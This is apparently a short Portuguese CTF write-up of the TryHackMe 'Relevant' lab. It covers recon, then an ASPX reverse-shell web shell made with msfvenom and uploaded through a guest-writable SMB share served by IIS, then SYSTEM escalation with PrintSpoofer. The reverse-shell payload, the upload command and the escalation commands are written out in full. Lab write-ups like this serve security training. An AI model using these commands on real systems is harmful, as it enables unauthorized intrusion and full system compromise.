Relevant

TryHackMe · Medium by Brenno M.

Relevant encadeia um compartilhamento SMB gravável que também é servido pelo IIS (permitindo subir uma web shell ASPX) e uma escalação a SYSTEM abusando do privilégio SeImpersonate com o PrintSpoofer.

Reconhecimento

O Nmap revela IIS (80 e uma porta alta, 49663), SMB e RDP. O compartilhamento nt4wrksv é acessível como convidado e contém credenciais codificadas em base64 (passwords.txt).

nmap -p- -T4 -sV -sC <IP>
smbclient //<IP>/nt4wrksv -N
get passwords.txt   # base64 -> credenciais

Foothold - SMB + IIS

O share nt4wrksv é o mesmo diretório servido pelo IIS na porta 49663. Sobe-se uma web shell ASPX (msfvenom) pelo SMB e acessa-se pela URL para obter shell como o app pool do IIS.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MEU_IP> LPORT=4444 -f aspx -o shell.aspx
smbclient //<IP>/nt4wrksv -N -c 'put shell.aspx'
curl http://<IP>:49663/nt4wrksv/shell.aspx

Escalação - PrintSpoofer

O whoami /priv mostra SeImpersonatePrivilege habilitado. O PrintSpoofer abusa desse privilégio para executar um comando como SYSTEM.

whoami /priv
PrintSpoofer64.exe -i -c cmd
# SYSTEM -> ler user.txt e root.txt
